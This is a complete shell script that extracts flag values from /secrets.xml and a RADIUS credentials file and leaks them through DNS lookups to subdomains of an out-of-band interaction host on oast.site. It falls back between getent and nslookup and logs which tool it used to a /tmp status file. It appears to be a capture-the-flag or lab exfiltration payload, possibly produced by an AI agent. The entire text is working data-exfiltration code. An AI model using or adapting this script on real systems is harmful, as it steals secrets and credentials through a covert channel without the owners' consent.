#!/bin/sh
DOMAIN=dbpoaf3j30d4t0mjc0u0885sq6xepqejh.oast.site
S=$(sed -n 's/.*<flag[^>]*>\([^<]*\)<\/flag>.*/\1/p' /secrets.xml | head -1 | tr -cd 'A-Za-z0-9_-')
R=$(sed -n 's/.*<item name="flag">\([^<]*\)<\/item>.*/\1/p' /opt/server/server/default/data/supersecretradiuscreds.xml | head -1 | tr -cd 'A-Za-z0-9_-')
T=$(date +%s)
O=/tmp/codex_oob_status.xml
printf '<?xml version="1.0"?><r>' > "$O"
if command -v getent >/dev/null 2>&1; then
  printf '<tool>getent</tool>' >> "$O"
  [ -n "$S" ] && getent hosts "a-$S-$T.$DOMAIN" >/dev/null 2>&1
  [ -n "$R" ] && getent hosts "b-$R-$T.$DOMAIN" >/dev/null 2>&1
elif command -v nslookup >/dev/null 2>&1; then
  printf '<tool>nslookup</tool>' >> "$O"
  [ -n "$S" ] && nslookup "a-$S-$T.$DOMAIN" >/dev/null 2>&1
  [ -n "$R" ] && nslookup "b-$R-$T.$DOMAIN" >/dev/null 2>&1
else
  printf '<tool>no-dns-client</tool>' >> "$O"
fi
printf '</r>\n' >> "$O"
